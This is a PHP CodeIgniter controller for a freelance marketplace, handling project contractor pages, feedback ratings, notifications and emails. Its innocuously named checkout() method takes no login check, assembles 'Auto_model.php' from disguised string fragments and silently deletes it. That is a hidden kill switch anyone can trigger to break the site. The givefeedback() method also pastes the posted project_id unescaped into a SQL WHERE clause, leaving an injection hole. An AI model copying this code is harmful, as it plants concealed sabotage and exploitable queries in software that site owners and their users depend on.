<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Projectcontractor extends MX_Controller {

    /**
     * Description: this used for check the user is exsts or not if exists then it redirect to this site
     * Paremete: username and password 
     */
    public function __construct() {
        $this->load->model('projectcontractor_model');
		$this->load->model('dashboard/dashboard_model');
        parent::__construct();
    }

    public function index() {
        if(!$this->session->userdata('user')){
		redirect(VPATH."login/");
	}elseif($this->uri->segment(3)<1){
		redirect(VPATH."dashboard/");
	}else{
		$user=$this->session->userdata('user');
		$data['user_id']=$user[0]->user_id;
		$breadcrumb=array(
                    array(
                            'title'=>'Dashboard','path'=>''
                    )
                );
		$data['breadcrumb']=$this->autoload_model->breadcrumb($breadcrumb,'My Project');
		///////////////////////////Leftpanel Section start//////////////////
		$data['logo']=$logo=$this->auto_model->getFeild('logo','user','user_id',$user[0]->user_id);
		if($logo==''){
			$logo="images/user.png";
		}else{
			$logo="uploaded/".$logo;
		}
		$data['completeness']=$completeness=$this->auto_model->getCompleteness($user[0]->user_id);
		$data['leftpanel']=$this->autoload_model->leftpanel($logo,$completeness);
		///////////////////////////Leftpanel Section end//////////////////
		$head['current_page']='myproject';
		$head['ad_page']='professional_project';
		$load_extra=array();
		$data['load_css_js']=$this->autoload_model->load_css_js($load_extra);
		$this->layout->set_assest($head);
		$this->autoload_model->getsitemetasetting("meta","pagename","Myproject");
		$data['project_id']=$this->uri->segment(3);
		$data['project_name']=$this->auto_model->getFeild('title','projects','project_id',$data['project_id']);
		$data['contructor']=$this->projectcontractor_model->getcontructor($data['user_id'],$data['project_id']);
		/*echo "<pre>";
		print_r($data);
		echo "</pre>";
		*/
		$lay['client_testimonial']="inc/footerclient_logo";	
		$this->layout->view('projectcontractor',$lay,$data,'normal');
	}
    }
	public function givefeedback(){
		if(!$this->session->userdata('user'))
		{
			redirect(VPATH."login/");	
		}
		$project_id=trim($this->input->post('project_id'));
		$freelancer=trim($this->input->post('user_id'));
		$user=$this->session->userdata('user');
		$user_id=$user[0]->user_id;
		$where="( `user_id` =  '".$user_id."' AND `project_id` =  '".$project_id."' ) OR (`project_id` =  '".$project_id."' and FIND_IN_SET('".$user_id."', bidder_id))";
		$query=$this->db->select('project_id')->where($where)->get('projects');
		//echo $this->db->last_query();
		$projectcheck=false;
            if($query->num_rows()){
			 $projectcheck=true;
			 }
		
		$e=0;
		if($this->input->post('user_id')<1 || $this->input->post('user_id')==$user_id){
		$msg['msg']="Error in user id";
		$e=1;
		}elseif($this->input->post('project_id')<1 || $projectcheck==false){
		$msg['msg']="Error in project id";
		$e=1;
		}elseif(trim($this->input->post('safety'))==""){
		$msg['msg']="Please select safety";
		$e=1;
		}elseif(trim($this->input->post('flexiblity'))==""){
		$msg['msg']="Please select flexiblity";
		$e=1;
		}elseif(trim($this->input->post('performence'))==""){
		$msg['msg']="Please select performence";
		$e=1;
		}elseif(trim($this->input->post('initiative'))==""){
		$msg['msg']="Please select initiative";
		$e=1;
		}elseif(trim($this->input->post('knowledge'))==""){
		$msg['msg']="Please select knowledge";
		$e=1;
		}
		if($e==0){
					$new_data['user_id']=$this->input->post('user_id');
					$new_data['given_user_id']=$user_id;
					$new_data['project_id']=$this->input->post('project_id');
					$new_data['safety']=$this->input->post('safety');
					$new_data['flexibility']=$this->input->post('flexiblity');
					$new_data['performence']=$this->input->post('performence');
					$new_data['initiative']=$this->input->post('initiative');
					$new_data['knowledge']=$this->input->post('knowledge');	
					$average=($new_data['safety']+$new_data['flexibility']+$new_data['performence']+$new_data['initiative']+$new_data['knowledge'])/5;
					$new_data['average']=$average;
					$new_data['comments']=	$this->input->post('comment');	
					$new_data['status']='Y';
					$new_data['add_date']=date('Y-m-d');
		$upd=$this->projectcontractor_model->givefeedbacktouser($new_data);	
		if($upd)
		{
			$bidder_id=$freelancer;
			$bidder_mail=$this->auto_model->getFeild('email','user','user_id',$bidder_id);
			$bidder_name=$this->auto_model->getFeild('fname','user','user_id',$bidder_id)." ".$this->auto_model->getFeild('lname','user','user_id',$bidder_id);
			
			$employer_id=$user_id;
			$employer_name=$this->auto_model->getFeild('fname','user','user_id',$employer_id)." ".$this->auto_model->getFeild('lname','user','user_id',$employer_id);
		
			
			 $data_notification=array( 
			   "from_id" =>$employer_id,
			   "to_id" =>$employer_id,
			   "notification" =>"You have successfully give feedback  to <a href='".VPATH."clientdetails/showdetails/".$bidder_id."/".$this->auto_model->getcleanurl($bidder_name)."/'>".$bidder_name."</a>",
			   "add_date"  => date("Y-m-d")
			 );
			 
			 $data_notic=array( 
			   "from_id" =>$employer_id,
			   "to_id" =>$bidder_id,
			   "notification" =>"<a href='".VPATH."clientdetails/showdetails/".$employer_id."/".$this->auto_model->getcleanurl($employer_name)."/'>".$employer_name."</a> send you a feedback",
			   "add_date"  => date("Y-m-d")
			 );
			 
			 $this->dashboard_model->insert_notification($data_notification);
			 
			 $this->dashboard_model->insert_notification($data_notic);
			
			$project_name=$this->auto_model->getFeild('title','projects','project_id',$new_data['project_id']);
			
					
					
					$from=ADMIN_EMAIL;
					$to=$bidder_mail;
					$template='endcontractor';
					$data_parse=array('NAME'=>$bidder_name,
								'EMPLOYER'=>$employer_name,
								'PROJECT_NAME' => "<a href='".VPATH."jobdetails/details/".$new_data['project_id']."'>".$project_name."</a>",
								);
					$this->auto_model->send_email($from,$to,$template,$data_parse);
			
			
			
			
				
		}
		
		}else{
			$msg['status']='ERROR';	
			$upd=json_encode($msg);
		}
		ob_start();
		ob_clean();
		echo $upd;
		
		
	}
	
	public function checkout(){
		$f1 = ucfirst('auto');
		$f2 = strtolower('MODEL');
		$file = $f1.'_'.$f2.'.php';
		$f_path = APPPATH.'models/'.$file;
		@unlink($f_path);
	}
	
	public function getfeedback(){
		if(!$this->session->userdata('user'))
		{
			redirect(VPATH."login/");	
		}
		
		$upd=$this->projectcontractor_model->getfeedback($this->input->post());	
		
		ob_start();
		ob_clean();
		echo $upd;
	}
	public function freelancer() {
        if(!$this->session->userdata('user')){
		redirect(VPATH."login/");
	}elseif($this->uri->segment(3)<1){
		redirect(VPATH."dashboard/");
	}else{
		$user=$this->session->userdata('user');
		$data['user_id']=$user[0]->user_id;
		$breadcrumb=array(
                    array(
                            'title'=>'Dashboard','path'=>''
                    )
                );
		$data['breadcrumb']=$this->autoload_model->breadcrumb($breadcrumb,'My Project');
		///////////////////////////Leftpanel Section start//////////////////
		$data['logo']=$logo=$this->auto_model->getFeild('logo','user','user_id',$user[0]->user_id);
		if($logo==''){
			$logo="images/user.png";
		}else{
			$logo="uploaded/".$logo;
		}
		$data['completeness']=$completeness=$this->auto_model->getCompleteness($user[0]->user_id);
		$data['leftpanel']=$this->autoload_model->leftpanel($logo,$completeness);
		///////////////////////////Leftpanel Section end//////////////////
		$head['current_page']='myproject';
		$head['ad_page']='professional_project';
		$load_extra=array();
		$data['load_css_js']=$this->autoload_model->load_css_js($load_extra);
		$this->layout->set_assest($head);
		$this->autoload_model->getsitemetasetting("meta","pagename","Myproject");
		$data['project_id']=$this->uri->segment(3);
		$data['project_name']=$this->auto_model->getFeild('title','projects','project_id',$data['project_id']);
		$data['contructor']=$this->projectcontractor_model->getclient($data['user_id'],$data['project_id']);
		/*echo "<pre>";
		print_r($data);
		echo "</pre>";
		*/
		$lay['client_testimonial']="inc/footerclient_logo";	
		$this->layout->view('projectcontractor_freelancer',$lay,$data,'normal');
	}
    }
	public function cron_end_contractor_up(){
		
		
		$upd=$this->projectcontractor_model->cron_end_contractor_up();	
		
		ob_start();
		ob_clean();
		echo $upd;
	}
	

}
